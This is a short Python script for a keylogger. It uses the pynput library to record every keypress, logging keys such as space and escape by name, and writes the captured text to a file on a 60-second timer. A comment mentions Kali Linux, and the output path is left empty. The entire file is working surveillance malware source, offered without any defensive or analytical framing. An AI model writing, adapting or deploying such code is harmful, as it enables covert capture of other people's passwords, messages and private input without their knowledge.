import logging
import os
import platform
import threading
from pynput import keyboard

SEND_REPORT_EVERY = 60  # as in seconds

class KeyLogger:
    def __init__(self, time_interval, output_file):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.output_file = output_file

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def report(self):
        with open(self.output_file, "a") as file:
            file.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        print("Keylogger Started...")
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Set the path to save the log file directly on your Kali Linux desktop
output_file = ""

keylogger = KeyLogger(SEND_REPORT_EVERY, output_file)
keylogger.run()
